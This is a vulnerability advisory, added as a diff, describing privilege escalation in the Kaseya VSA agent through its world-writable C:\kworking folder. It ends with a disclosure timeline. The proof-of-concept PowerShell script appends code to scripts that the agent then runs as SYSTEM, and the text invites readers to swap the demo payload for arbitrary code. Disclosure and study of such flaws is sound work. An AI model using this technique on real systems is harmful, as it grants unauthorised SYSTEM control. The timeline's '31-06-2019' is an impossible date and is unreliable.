@@ -1,0 +1,58 @@
+# Exploit Title: Kaseya VSA agent <= 9.5 privilege escalation
+# Google Dork: N/A
+# Date: 2-09-2019
+# Exploit Author: NF
+# Vendor Homepage: https://www.kaseya.com/products/vsa/
+# Software Link: https://www.kaseya.com/products/vsa/
+# Version:  <= 9.5 agentmon.exe
+# Tested on: Windows 10
+# CVE : N/A
+
+
+##Vulnerability##
+
+This is not a new issue as such but more of the same in line with <a href="https://www.securityfocus.com/archive/1/541884/30/300/threaded">CVE-2017-12410</a> found by Filip Palian.
+A a fix was put in place for the original CVE, however it was specific to binaries and not scripts.
+The root cause for both issues is allowing a low privileged group excessive permissions to a folder used by a elevated process.
+
+The Kaseya agent (agentmon.exe) runs as SYSTEM by default.
+The agent also has a default working folder @ C:\kworking\
+It will pull scripts and binaries to this folder and execute them from disk from the controlling web application.
+By default the *Authenticated Users* group has all rights to this folder.
+
+Scripts are written to disk however they are not checked for integrity prior to execution.
+So a folder can be monitored for script files being dropped and then append malicious code prior to execution.
+
+##Proof of concept##
+
+This PowerShell script will monitor the default working directory.
+When a ps1 script drops from a scheduled task or run from the VSA web application it will then append the command "Write-Host 'injected content'" which will run as SYSTEM.
+Change the Write-Host command to the code to be executed or update the script to target other script drops such as vb script.
+
+Note: To test you will need to sign up for a trial with VSA to have the ability to deploy an agent & schedule/run scripts
+
+<--script start-->
+
+      $folder = 'c:\kworking'
+      $filter = '*.ps1'                          
+
+      $filesystem = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter =  [IO.NotifyFilters]'FileName, LastWrite'}
+
+      Register-ObjectEvent $filesystem Created -SourceIdentifier FileCreated -Action {
+          $path = $Event.SourceEventArgs.FullPath
+          "`nWrite-Host 'injected content'" | Out-File -Append -FilePath $path -Encoding utf8
+          Unregister-Event FileCreated
+      }
+ 
+<--script end-->
+
+##Timeline##
+
+16-06-2019 :: Issue found
+18-06-2019 :: security@ emailed requesting steps to disclose  
+30-06-2019 :: CERT contacted due to non response of vendor from official email address
+31-06-2019 :: CERT still unable to contact vendor
+07-07-2019 :: CERT makes contact with vendor. Discover security@ address is not monitored by vendor
+20-08-2019 :: Vendor confirms receipt of details
+27-08-2019 :: Email sent indicating intention to disclose due to lack of response
+02-09-2019 :: No response through CERT. Findings published
